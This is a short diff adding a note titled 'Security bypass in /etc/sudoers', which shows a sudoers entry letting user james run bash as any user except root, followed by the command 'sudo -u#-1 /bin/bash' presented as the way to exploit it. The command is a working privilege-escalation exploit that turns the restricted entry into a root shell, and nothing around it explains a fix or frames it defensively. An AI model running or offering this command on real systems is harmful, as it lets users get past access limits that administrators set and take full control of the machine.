@@ -1,0 +1,9 @@
+Security bypass in /etc/sudoers
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+james ALL=(ALL,!root) /bin/bash
+\
+To exploit this configuration, use the following command line:
+
+sudo -u#-1 /bin/bash
